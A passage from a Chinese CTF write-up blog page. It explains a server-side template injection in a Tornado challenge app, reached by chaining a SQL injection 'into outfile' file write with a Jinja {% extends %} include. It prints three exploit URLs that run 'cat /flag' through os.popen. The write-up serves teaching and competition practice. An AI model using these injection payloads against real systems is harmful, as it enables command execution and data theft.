<span class="string">&#x27;/index.php&#x27;</span>, MainHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/login.php&#x27;</span>, LoginHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/logout.php&#x27;</span>, LogoutHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/register.php&#x27;</span>, RegisterHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/admin.php&#x27;</span>, AdminHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>, MainHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    print(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<img src="http://img.npfs06.top/20210723155111.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">
+
+<p>在<code>/good_job_my_ctfer.php</code>路由对应的处理部分，有个ssti，但过滤的很死。因为<code>&#123;&#123;&#125;&#125;</code>被过滤，所以只能用<code>&#123;%%&#125;\` 这一步用到的为**&#123;%extends %&#125;**，它的参数为一个文件，会将其包含并渲染。所以思路为上传一个文件，然后extends包含并渲染。这里通过register向服务器写入文件。具体实现为通过注册功能将代码写入数据库，再通过</code>into outfile<code>语句将其导出为文件。导出文件路径为</code>/var/lib/mysql-files/`，因为mysql只在这里有写的权限。</p>
+<p>exp</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/register.php?username=npfs&amp;password=&#123;% <span class="keyword">set</span> return <span class="comment">__import__(</span><span class="comment">&quot;os&quot;</span><span class="comment">).popen(</span><span class="comment">&quot;cat  /flag&quot;</span><span class="comment">).read()%&#125;</span></span><br><span class="line">/register.php?username=npfs<span class="comment">&#x27; into outfile &#x27;</span>/var/lib/mysql-files/npfs&amp;password=npfs</span><br><span class="line">/good_job_my_ctfer.php?congratulations=&#123;% extends /var/<span class="comment">lib</span>/mysql-<span class="keyword">files</span>/<span class="comment">npfs%&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244153#h2-4">https://www.anquanke.com/post/id/244153#h2-4</a></p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96admin%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">sql注入获取admin账号密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#os-path-join%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">2.</span> <span class="nav-text">os.path.join任意文件读取</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
